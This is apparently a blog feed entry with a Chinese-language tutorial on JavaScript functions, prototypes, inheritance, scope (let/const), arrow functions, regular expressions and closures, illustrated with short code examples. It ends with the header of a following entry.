        <content type="html"><![CDATA[<h2 id="定义和调用函数"><a href="#定义和调用函数" class="headerlink" title="定义和调用函数"></a>定义和调用函数</h2><h3 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h3><pre class=" language-bash"><code class="language-bash">//方法一：函数表达式//函数也是值，可以把函数类型值赋给变量，cube相当于函数名var cube <span class="token operator">=</span> function<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> x*x*x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>//方法二：函数声明<span class="token keyword">function</span> cube<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> x*x*x<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>//调用alert<span class="token punctuation">(</span>cube<span class="token punctuation">(</span>2<span class="token punctuation">))</span><span class="token punctuation">;</span>  //方法一方法二的函数均可用此方式调用</code></pre><p>函数声明方式可以在定义之前被调用，函数表达式则不行</p><blockquote><p>注：如果一个函数完成了其主体的执行，却没有执行任何return语句，它会返回undefined。</p></blockquote><h3 id="将对象引用作为参数传递"><a href="#将对象引用作为参数传递" class="headerlink" title="将对象引用作为参数传递"></a>将对象引用作为参数传递</h3><h4 id="无返回值-方法"><a href="#无返回值-方法" class="headerlink" title="无返回值(方法)"></a>无返回值(方法)</h4><pre class=" language-bash"><code class="language-bash">var upperCase <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">{</span>    for<span class="token punctuation">(</span>var i<span class="token operator">=</span>0<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>a.length<span class="token punctuation">;</span>i +<span class="token operator">=</span> 1<span class="token punctuation">)</span><span class="token punctuation">{</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span>.toUpperCase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>//测试结果upperCase<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  //undefinedupperCase<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"hello"</span>,<span class="token string">""</span>,<span class="token string">"world"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   //undefinedvar dog <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"hello"</span>,<span class="token string">"world"</span><span class="token punctuation">]</span>upperCase<span class="token punctuation">(</span>dog<span class="token punctuation">)</span>   //undefineddog              //<span class="token punctuation">[</span><span class="token string">"HELLO"</span>,<span class="token string">"WORLD"</span><span class="token punctuation">]</span></code></pre><p>根据上述代码可知，upperCase没有返回值，但是，它修改了传递给它的对象的属性</p><h4 id="有返回值-函数"><a href="#有返回值-函数" class="headerlink" title="有返回值(函数)"></a>有返回值(函数)</h4><pre class=" language-bash"><code class="language-bash">var upperCase <span class="token operator">=</span> function<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">{</span>    var result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    for<span class="token punctuation">(</span>var i<span class="token operator">=</span>0<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>a.length<span class="token punctuation">;</span>i+<span class="token operator">=</span>1<span class="token punctuation">)</span><span class="token punctuation">{</span>        result.push<span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span>.toUpperCase<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>//测试结果upperCase<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  //<span class="token punctuation">[</span><span class="token punctuation">]</span>upperCase<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"hello"</span>,<span class="token string">""</span>,<span class="token string">"world"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   //<span class="token punctuation">[</span><span class="token string">"HELLO"</span>,<span class="token string">""</span>,<span class="token string">"WORLD"</span><span class="token punctuation">]</span>var dog <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"hello"</span>,<span class="token string">"world"</span><span class="token punctuation">]</span>upperCase<span class="token punctuation">(</span>dog<span class="token punctuation">)</span>   //<span class="token punctuation">[</span><span class="token string">"HELLO"</span>,<span class="token string">"WORLD"</span><span class="token punctuation">]</span>dog   //<span class="token punctuation">[</span><span class="token string">"hello"</span>,<span class="token string">"world"</span><span class="token punctuation">]</span></code></pre><h3 id="自调用函数"><a href="#自调用函数" class="headerlink" title="自调用函数"></a>自调用函数</h3><p>如果表达式后紧跟()，则会自动调用。</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span>function <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    var x <span class="token operator">=</span> <span class="token string">"Hello!!"</span><span class="token punctuation">;</span>      // 我将调用自己<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //最外层的括号说明它是一个表达式</code></pre><blockquote><p>注：不能调用声明的函数</p></blockquote><h2 id="作为对象的函数"><a href="#作为对象的函数" class="headerlink" title="作为对象的函数"></a>作为对象的函数</h2><h3 id="函数的属性"><a href="#函数的属性" class="headerlink" title="函数的属性"></a>函数的属性</h3><pre class=" language-bash"><code class="language-bash"><span class="token keyword">function</span> plus1<span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>plus1.invocations <span class="token operator">==</span> undefined<span class="token punctuation">)</span> <span class="token punctuation">{</span>        plus1.invocations <span class="token operator">=</span> 0<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    plus1.invocations++<span class="token punctuation">;</span>    <span class="token keyword">return</span> value + 1<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>上例中invocation代表函数被调用的次数，相当于面向对象程序设计中的静态属性。</p><h4 id="函数的prototype属性"><a href="#函数的prototype属性" class="headerlink" title="函数的prototype属性"></a>函数的prototype属性</h4><p>每个对象都有prototype属性，prototype属性用于向类的构造器中加入新的属性</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">function</span> Rectangle<span class="token punctuation">(</span>width, height<span class="token punctuation">)</span> <span class="token punctuation">{</span>    this.width <span class="token operator">=</span> width<span class="token punctuation">;</span>    this.height <span class="token operator">=</span> height<span class="token punctuation">;</span><span class="token punctuation">}</span>Rectangle.prototype.area <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> this.width*this.height<span class="token punctuation">;</span><span class="token punctuation">}</span>Rectangle.prototype.description<span class="token operator">=</span><span class="token string">"hello"</span><span class="token punctuation">;</span></code></pre><h3 id="作为属性的函数"><a href="#作为属性的函数" class="headerlink" title="作为属性的函数"></a>作为属性的函数</h3><pre class=" language-bash"><code class="language-bash"><span class="token keyword">let</span> operson <span class="token operator">=</span> <span class="token punctuation">{</span>  firstName: <span class="token string">"John"</span>,  lastName <span class="token keyword">:</span> <span class="token string">"Doe"</span>,  <span class="token function">id</span>       <span class="token keyword">:</span> 5566,  fullName <span class="token keyword">:</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> this.firstName + <span class="token string">" "</span> + this.lastName<span class="token punctuation">;</span>  ////this指的是当前对象，即o  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><blockquote><p>注：使用this表达式的函数属性称为方法，上例中fullName就是operson的方法</p></blockquote><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><pre class=" language-bash"><code class="language-bash"><span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token punctuation">{</span>count: 0<span class="token punctuation">}</span><span class="token punctuation">;</span>o.increment<span class="token operator">=</span>function<span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">{</span>    if<span class="token punctuation">(</span>amount<span class="token operator">==</span>undefined<span class="token punctuation">)</span><span class="token punctuation">{</span>        amount<span class="token operator">=</span>1<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    this.count+<span class="token operator">=</span>amount<span class="token punctuation">;</span>    <span class="token keyword">return</span> this.count<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>//Method invocation:o.increment<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//returns 1o.increment<span class="token punctuation">(</span>3<span class="token punctuation">)</span><span class="token punctuation">;</span>//returns 4</code></pre><h4 id="this"><a href="#this" class="headerlink" title="this"></a>this</h4><p>方法中的this指向当前对象，方法之外的this指全局变量。(不建议在方法外使用this)</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token punctuation">{</span>oldProp: <span class="token string">'this is an old property'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>o.aMethod <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    this.newProp <span class="token operator">=</span> <span class="token string">"this is a new property"</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> Object.keys<span class="token punctuation">(</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span> // will contain <span class="token string">'newProp'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>o.aMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> // will <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string">'oldProp'</span>,<span class="token string">'aMethod'</span>,<span class="token string">'newProp'</span><span class="token punctuation">]</span></code></pre><h3 id="构造器-类"><a href="#构造器-类" class="headerlink" title="构造器(类)"></a>构造器(类)</h3><pre class=" language-bash"><code class="language-bash"><span class="token keyword">function</span> Rectangle<span class="token punctuation">(</span>width, height<span class="token punctuation">)</span> <span class="token punctuation">{</span>    this.width <span class="token operator">=</span> width<span class="token punctuation">;</span>    this.height <span class="token operator">=</span> height<span class="token punctuation">;</span>    this.area <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> this.width*this.height<span class="token punctuation">;</span> <span class="token punctuation">}</span>  //此种定义方式有严重缺陷<span class="token punctuation">}</span>var r <span class="token operator">=</span> new Rectangle<span class="token punctuation">(</span>26, 14<span class="token punctuation">)</span><span class="token punctuation">;</span>r.constructor.name <span class="token operator">==</span> <span class="token string">'Rectangle'</span>console.log<span class="token punctuation">(</span>r<span class="token punctuation">)</span></code></pre><p>在构造器里出现的函数叫做构造函数，上例中area()是Rectangle的构造函数，但是此种定义方式有严重缺陷，在每创建一个Rectangle对象时，也创建了计算面积的方法，会浪费大量内存来保存面积的冗余副本，此问题在javascript可以用prototype解决</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">function</span> Rectangle<span class="token punctuation">(</span>width,height<span class="token punctuation">)</span><span class="token punctuation">{</span>    this.width <span class="token operator">=</span> width<span class="token punctuation">;</span>    this.height <span class="token operator">=</span> height<span class="token punctuation">;</span><span class="token punctuation">}</span>Rectangle.prototype.area <span class="token operator">=</span> function<span class="token punctuation">(</span>width,height<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> this.width * this.height<span class="token punctuation">;</span><span class="token punctuation">}</span>var r <span class="token operator">=</span> new Rectangle<span class="token punctuation">(</span>26, 14<span class="token punctuation">)</span><span class="token punctuation">;</span>r.constructor.name <span class="token operator">==</span> <span class="token string">'Rectangle'</span>console.log<span class="token punctuation">(</span>r<span class="token punctuation">)</span></code></pre><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>通过prototype属性继承</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">function</span> Shape<span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">{</span>    this.str<span class="token operator">=</span>str<span class="token punctuation">;</span>  <span class="token punctuation">}</span>Shape.prototype.sdescription<span class="token operator">=</span><span class="token string">"Shape"</span><span class="token keyword">function</span> Rectangle<span class="token punctuation">(</span>width, height<span class="token punctuation">)</span> <span class="token punctuation">{</span>    this.width <span class="token operator">=</span> width<span class="token punctuation">;</span>    this.height <span class="token operator">=</span> height<span class="token punctuation">;</span><span class="token punctuation">}</span>Rectangle.prototype <span class="token operator">=</span> new Shape<span class="token punctuation">(</span><span class="token string">"shape"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //Rectangle继承了Shapevar r<span class="token operator">=</span>new Rectangle<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><pre class=" language-bash"><code class="language-bash">var shape <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>shape.prototype.draw <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token string">"i am generic shape"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>//circlevar circle <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>circle.prototype <span class="token operator">=</span> Object.create<span class="token punctuation">(</span>shape.prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>circle.prototype.draw<span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>return <span class="token string">"i am a circle"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>//trianglevar triangle <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>triangle.prototype <span class="token operator">=</span> Object.create<span class="token punctuation">(</span>shape.prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>triangle.prototype.draw<span class="token operator">=</span> function<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token string">"this is triangle"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>var shapes <span class="token operator">=</span> <span class="token punctuation">[</span>new shape<span class="token punctuation">(</span><span class="token punctuation">)</span>, new circle<span class="token punctuation">(</span><span class="token punctuation">)</span>, new triangle<span class="token punctuation">(</span>23<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>shapes.forEach <span class="token punctuation">(</span>function <span class="token punctuation">(</span>shapeList<span class="token punctuation">)</span><span class="token punctuation">{</span>    console.log<span class="token punctuation">(</span>shapeList.draw<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><h3 id="use-strict"><a href="#use-strict" class="headerlink" title="use strict"></a>use strict</h3><p>use strict是严格模式，在此模式下不能使用未声明的变量</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token string">"use strict"</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>foo<span class="token punctuation">)</span>  //error,未声明    alert<span class="token punctuation">(</span><span class="token string">"happy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span>    y <span class="token operator">=</span> 3.14<span class="token punctuation">;</span>//error，未声明    alert<span class="token punctuation">(</span><span class="token string">"sad"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><h3 id="let"><a href="#let" class="headerlink" title="let"></a>let</h3><p>let的作用域范围是一个代码块{}，{}外不能访问</p><pre class=" language-bash"><code class="language-bash">var x <span class="token operator">=</span> 10<span class="token punctuation">;</span>// Here x is 10<span class="token punctuation">{</span>  var x <span class="token operator">=</span> 2<span class="token punctuation">;</span>// Here x is 2<span class="token punctuation">}</span>// Here x is 2  </code></pre><pre class=" language-bash"><code class="language-bash">var x <span class="token operator">=</span> 10<span class="token punctuation">;</span>// Here x is 10<span class="token punctuation">{</span><span class="token keyword">let</span> x <span class="token operator">=</span> 2<span class="token punctuation">;</span>// Here x is 2<span class="token punctuation">}</span>// Here x is 10</code></pre><h3 id="const"><a href="#const" class="headerlink" title="const"></a>const</h3><p>const 用于声明一个或多个常量，声明时必须进行初始化，且初始化后值不可再修改,const定义的变量并非常量，并非不可变，它定义了一个常量引用一个值。使用const 定义的对象或者数组，其实是可变的。下面的代码并不会报错：</p><pre class=" language-bash"><code class="language-bash">// You can create a constant array:const cars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Saab"</span>, <span class="token string">"Volvo"</span>, <span class="token string">"BMW"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>// You can change an element:cars<span class="token punctuation">[</span>0<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Toyota"</span><span class="token punctuation">;</span>// You can add an element:cars.push<span class="token punctuation">(</span><span class="token string">"Audi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>但是不能对常量对象重新赋值</p><pre class=" language-bash"><code class="language-bash">const car <span class="token operator">=</span> <span class="token punctuation">{</span>type:<span class="token string">"Fiat"</span>, model:<span class="token string">"500"</span>, color:<span class="token string">"white"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>car <span class="token operator">=</span> <span class="token punctuation">{</span>type:<span class="token string">"Volvo"</span>, model:<span class="token string">"EX60"</span>, color:<span class="token string">"red"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    // 错误</code></pre><h2 id="头等函数-first-class-function"><a href="#头等函数-first-class-function" class="headerlink" title="头等函数(first-class function)"></a>头等函数(first-class function)</h2><ul><li>将函数赋值给变量或将它们存储在变量中，数据结构——函数表达式</li><li>将函数作为参数传递给其他函数</li><li>将函数作为其他函数的值返回<pre class=" language-bash"><code class="language-bash">var aFuncVar <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>console.log<span class="token punctuation">(</span><span class="token string">'Called with'</span>, x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> x+1<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> myFunc<span class="token punctuation">(</span>routine<span class="token punctuation">)</span> <span class="token punctuation">{</span> // passed as a paramconsole.log<span class="token punctuation">(</span><span class="token string">'Called with'</span>, routine.toString<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>var retVal <span class="token operator">=</span> routine<span class="token punctuation">(</span>10<span class="token punctuation">)</span><span class="token punctuation">;</span>//var retVal<span class="token operator">=</span>routine<span class="token punctuation">;</span>console.log<span class="token punctuation">(</span><span class="token string">'retVal'</span>, retVal<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> retVal<span class="token punctuation">;</span><span class="token punctuation">}</span>myFunc<span class="token punctuation">(</span>aFuncVar<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class=" language-bash"><code class="language-bash">//运行结果Called with <span class="token keyword">function</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>console.log<span class="token punctuation">(</span><span class="token string">'Called with'</span>, x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> x+1<span class="token punctuation">;</span><span class="token punctuation">}</span>Called with 10retVal 1111</code></pre></li></ul><h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><p>创建函数的一种更简单的方法<br><font color="#fb8c00">let 函数名= (参数)=&gt;表达式</font></p><pre class=" language-bash"><code class="language-bash">//箭头函数<span class="token keyword">let</span> <span class="token function">sum</span> <span class="token operator">=</span> <span class="token punctuation">(</span>a,b<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span>a+b<span class="token punctuation">;</span>//函数表达式<span class="token keyword">let</span> <span class="token function">sum</span> <span class="token operator">=</span> function<span class="token punctuation">(</span>a,b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> a+b<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>alert<span class="token punctuation">(</span>sum<span class="token punctuation">(</span>1,2<span class="token punctuation">))</span><span class="token punctuation">;</span>  //3</code></pre><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="正则表达式简介"><a href="#正则表达式简介" class="headerlink" title="正则表达式简介"></a>正则表达式简介</h3><ul><li>正则表达式是组成搜索模式的字符序列。javascript的正则表达式以斜线(/…/)界定。</li><li>对于正则表达式用test方法，会返回true\false，说明一个正则表达式是否与一个字符串匹配</li><li>对于字符串应用search方法，将会返回字符串中每一个匹配的位置(如果不匹配则返回-1)<pre class=" language-bash"><code class="language-bash">/^Once/   //匹配以Once开头的字符串/ss$/   //匹配以ss结尾的字符串/go*gle/  //表示o可以为0个或多个,包括ggle、gogle、google等  </code></pre></li></ul><h3 id="捕获"><a href="#捕获" class="headerlink" title="捕获"></a>捕获</h3><p>字符串match方法和正则表达式exec方法，捕获字符串中与正则表达式匹配的部分</p><h3 id="数量词"><a href="#数量词" class="headerlink" title="数量词"></a>数量词</h3><ul><li>a?匹配零个或一个a</li><li>a*匹配零个或多个a</li><li>a+匹配一个或多个a<br>这些数量词会匹配尽可能多的字符，如果要匹配较少的字符，应当使用??、* ?、+?<pre class=" language-bash"><code class="language-bash"><span class="token string">"aaaah"</span>.match<span class="token punctuation">(</span>/a+/<span class="token punctuation">)</span> //aaaa<span class="token string">"aaaah"</span>.match<span class="token punctuation">(</span>/a+?/<span class="token punctuation">)</span> //a<span class="token string">"aaaah"</span>.match<span class="token punctuation">(</span>/a*/<span class="token punctuation">)</span>  //aaaa<span class="token string">"aaaah"</span>.match<span class="token punctuation">(</span>/a*?/<span class="token punctuation">)</span>  //<span class="token string">""</span><span class="token string">"aaaah"</span>.match<span class="token punctuation">(</span>/a?/<span class="token punctuation">)</span>   //a<span class="token string">"aaaah"</span>.match<span class="token punctuation">(</span>/a??/<span class="token punctuation">)</span>  //<span class="token string">""</span></code></pre></li></ul><h3 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h3><ul><li>\d 寻找一个数据</li><li>\s 寻找一个空白字符</li><li>\b 在开始或结尾找到一个匹配项<pre class=" language-bash"><code class="language-bash"><span class="token string">'XXX abbbbbbc'</span>.search<span class="token punctuation">(</span>/ab+c/<span class="token punctuation">)</span><span class="token punctuation">;</span> // Returns 4 <span class="token punctuation">(</span>position of <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token string">'XXX ac'</span>.search<span class="token punctuation">(</span>/ab+c/<span class="token punctuation">)</span><span class="token punctuation">;</span> // Returns -1, no match<span class="token string">'XXX ac'</span>.search<span class="token punctuation">(</span>/ab*c/<span class="token punctuation">)</span><span class="token punctuation">;</span> // Returns 4<span class="token string">'12e34'</span>.search<span class="token punctuation">(</span>/<span class="token punctuation">[</span>^\d<span class="token punctuation">]</span>/<span class="token punctuation">)</span><span class="token punctuation">;</span> // Returns 2<span class="token string">'foo: bar;'</span>.search<span class="token punctuation">(</span>/<span class="token punctuation">..</span>.\s*:\s*<span class="token punctuation">..</span>.\s*<span class="token punctuation">;</span>/<span class="token punctuation">)</span><span class="token punctuation">;</span> // Returns 0</code></pre></li></ul><h3 id="正则表达式修饰符"><a href="#正则表达式修饰符" class="headerlink" title="正则表达式修饰符"></a>正则表达式修饰符</h3><ul><li>i 忽略大小写</li><li>g 全局</li><li>m 多行<pre class=" language-bash"><code class="language-bash">/HALT/.test<span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span> // 如果str里有HALT的子字符串，则返回true/halt/i.test<span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span> // 同上但忽略大小写/<span class="token punctuation">[</span>Hh<span class="token punctuation">]</span>alt <span class="token punctuation">[</span>A-Z<span class="token punctuation">]</span>/.test<span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span> // <span class="token punctuation">[</span>Hh<span class="token punctuation">]</span>表示开头为H、h <span class="token punctuation">[</span>A-Z<span class="token punctuation">]</span>表示26个大写字母中的一个 eg.halt A \ Halt B</code></pre></li></ul><h2 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h2><p>将函数作为参数传递</p><pre class=" language-bash"><code class="language-bash">var anArr <span class="token operator">=</span> <span class="token punctuation">[</span>45, 4, 9, 16, 25<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> filterFunc<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> value <span class="token operator">&lt;</span>45<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> mapFunc<span class="token punctuation">(</span>value,ind<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> value*ind<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> reduceFunc<span class="token punctuation">(</span>total,value<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> total+value<span class="token punctuation">;</span><span class="token punctuation">}</span>anArr.filter<span class="token punctuation">(</span>filterFunc<span class="token punctuation">)</span>.map<span class="token punctuation">(</span>mapFunc<span class="token punctuation">)</span>.reduce<span class="token punctuation">(</span>reduceFunc<span class="token punctuation">)</span><span class="token punctuation">;</span>//执行filter后：<span class="token punctuation">[</span>4,9,16,25<span class="token punctuation">]</span>//执行map后：<span class="token punctuation">[</span>0,9,32,75<span class="token punctuation">]</span>//执行reduce后：116</code></pre><blockquote><p>注：filter()\map()\reduce()方法使用方法请参考此博客的javascript1</p></blockquote><p>上述编程可以写为</p><pre class=" language-bash"><code class="language-bash">anArr.filter<span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token operator">></span>value<span class="token operator">&lt;</span>45<span class="token punctuation">)</span>.map<span class="token punctuation">((</span>value,ind<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span>value*ind<span class="token punctuation">)</span>.reduce<span class="token punctuation">((</span>total,value<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span>total+value<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><pre class=" language-bash"><code class="language-bash">var globalVar <span class="token operator">=</span> 1<span class="token punctuation">;</span><span class="token keyword">function</span> localFunc<span class="token punctuation">(</span>argVar<span class="token punctuation">)</span> <span class="token punctuation">{</span>    var localVar <span class="token operator">=</span> 0<span class="token punctuation">;</span>    <span class="token keyword">function</span> embedFunc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> ++localVar + argVar + globalVar<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> embedFunc<span class="token punctuation">;</span><span class="token punctuation">}</span>var myFunc <span class="token operator">=</span> localFunc<span class="token punctuation">(</span>10<span class="token punctuation">)</span><span class="token punctuation">;</span>  //返回embedFunc函数myFunc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>// 直接调用embedFunc函数，即localVar <span class="token operator">=</span>0 不再执行，只执行embedFunc函数</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构与算法</title>
      <link href="/2019/10/09/datastructure1/"/>
      <url>/2019/10/09/datastructure1/</url>
      
